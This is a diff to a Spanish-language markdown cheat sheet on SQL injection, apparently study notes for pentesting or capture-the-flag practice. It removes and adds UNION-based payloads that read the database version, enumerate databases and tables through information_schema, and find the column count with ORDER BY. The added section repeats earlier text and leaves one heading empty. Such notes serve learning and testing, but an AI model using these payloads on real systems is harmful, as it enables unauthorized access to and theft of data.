@@ -20,14 +20,17 @@ Una vez ya hemos identificado las columnas debemos probar con un
 Para extraer la versión
 `' union select 1,@@version-- -`, nos devolverá toda la información de la base de datos
 
-Para enumerar las bases de datos existentes
-`' union select 1,schema_name from information_schema.schemata-- -`
+## Listar numero de columnas de una tabla
 
-No siempre se nos pueden volcar todas las bases de datos, por lo cual podemos usar 
-`' union select 1,schema_name from information_schema.schemata limit 1,1-- -`, donde vamos enumerando uno a uno las bases de datos
+#### Identificando cadenas nulas
+Identificar el numero de columnas
+`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
-Con una base de datos que nos interese podemos acceder a su contenido con
-`' union select 1,table_name from information_schema.tables limit 1,1-- -`
+Una vez ya hemos identificado las columnas debemos probar con un
+`' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, en este caso nos devolveria una cadena de valores vacios
+
+#### Identificando cadenas con texto
+
 
 
 ## Listar contenido de las bases de datos
